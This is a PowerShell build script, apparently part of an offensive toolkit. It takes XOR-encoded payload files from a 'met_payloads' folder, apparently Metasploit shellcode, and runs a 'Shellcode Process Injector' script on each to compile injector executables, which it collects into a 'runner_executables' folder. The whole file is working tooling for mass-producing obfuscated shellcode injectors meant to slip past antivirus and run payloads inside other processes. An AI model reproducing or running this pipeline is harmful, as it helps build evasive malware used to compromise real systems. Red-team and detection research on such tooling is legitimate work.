$runner_folder = "runner_executables"

# Remove old xor_met_payloads folder
if (Test-Path $runner_folder) {
    Remove-Item $runner_folder -Recurse -Force
    Write-Host "Folder '$runner_folder' has been deleted."
} else {
    Write-Host "Folder '$runner_folder' doesn't exist."
}

mkdir .\\$runner_folder

# Specify the folder path where you want to search
$met_payloads_path = "/met_payloads/"

# Get all files recursively
$files = Get-ChildItem -Path $met_payloads_path -Recurse -File

# Loop through each file
foreach ($file in $files) {
    # Check if the file name starts with "xor_"
    if ($file.Name -like "xor_*") {
        $XorPayloadPath = $file.FullName
        & 'Shellcode Process Injector/2.1_replace_payload_with_XOR_payload.ps1' 'Shellcode Process Injector' $XorPayloadPath
        Write-Host "Executed compile_shellcode_process_injector.ps1 for: $XorPayloadPath"
    }
}

# Move all the ShellcodeInjector executables to $runner_folder
# Get all files starting with "ShellcodeProcessInjector_" in the source folder
$filesToMove = Get-ChildItem -Path './' -File | Where-Object { $_.Name -like "ShellcodeProcessInjector_*" }

# Move each file to the destination $runner_folder
foreach ($file in $filesToMove) {
    Move-Item -Path $file.FullName -Destination $runner_folder
    Write-Host "Moved $($file.Name) to $runner_folder"
}